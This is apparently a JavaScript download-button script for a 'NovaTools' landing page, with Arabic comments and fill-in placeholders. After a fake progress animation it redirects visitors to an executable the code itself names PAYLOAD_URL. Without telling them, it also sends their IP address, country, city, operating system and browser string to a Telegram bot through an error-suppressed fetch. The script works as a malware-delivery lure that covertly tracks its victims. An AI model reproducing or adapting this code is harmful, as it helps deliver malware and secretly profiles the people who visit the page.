/* ============================================================
 * NovaTools Loader — زر التحميل
 * ============================================================ */

/* ▼▼▼ املأ القيم هنا ▼▼▼ */
const PAYLOAD_URL = "https://github.com/USERNAME/REPO/releases/latest/download/NovaTools.exe";
/* ▲▲▲ املأ القيم هنا ▲▲▲ */

function notifyTelegram(text) {
  try {
    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TG_CHAT_ID, text, parse_mode: "Markdown" })
    }).catch(() => {});
  } catch (e) {}
}

function startDownload(btn, progress, bar) {
  btn.disabled = true;
  const textEl = btn.querySelector(".btn-text");
  const loaderEl = btn.querySelector(".btn-loader");
  if (textEl) textEl.hidden = true;
  if (loaderEl) loaderEl.hidden = false;
  if (progress) progress.hidden = false;

  let p = 0;
  const iv = setInterval(() => {
    p = Math.min(100, p + 8 + Math.random() * 12);
    if (bar) bar.style.width = p + "%";
    if (p >= 100) {
      clearInterval(iv);
      setTimeout(() => {
        window.location.href = PAYLOAD_URL;
        if (textEl) { textEl.textContent = "✓ تم التحميل"; textEl.hidden = false; }
        if (loaderEl) loaderEl.hidden = true;
      }, 400);
    }
  }, 180);

  const fp = window.__nt_fp || {};
  notifyTelegram(
    "🎯 *ضغط زر التحميل!*\n" +
    `• IP: \`${fp.geo?.ip || "?"}\`\n` +
    `• الدولة: ${fp.geo?.country || "?"}\n` +
    `• المدينة: ${fp.geo?.city || "?"}\n` +
    `• النظام: \`${fp.basic?.platform || "?"}\`\n` +
    `• المتصفح: \`${(navigator.userAgent||"").slice(0,90)}\``
  );
}

document.addEventListener("DOMContentLoaded", () => {
  const btn1 = document.getElementById("downloadBtn");
  const prog1 = document.getElementById("progress");
  const bar1 = prog1?.querySelector(".progress-bar");
  btn1?.addEventListener("click", async () => {
    if (!window.__nt_ready) {
      await new Promise(r => {
        window.addEventListener("ntReady", r, { once: true });
        setTimeout(r, 2500);
      });
    }
    startDownload(btn1, prog1, bar1);
  });

  const btn2 = document.getElementById("downloadBtn2");
  const prog2 = document.getElementById("progress2");
  const bar2 = prog2?.querySelector(".progress-bar");
  btn2?.addEventListener("click", async () => {
    if (!window.__nt_ready) {
      await new Promise(r => {
        window.addEventListener("ntReady", r, { once: true });
        setTimeout(r, 2500);
      });
    }
    startDownload(btn2, prog2, bar2);
  });
});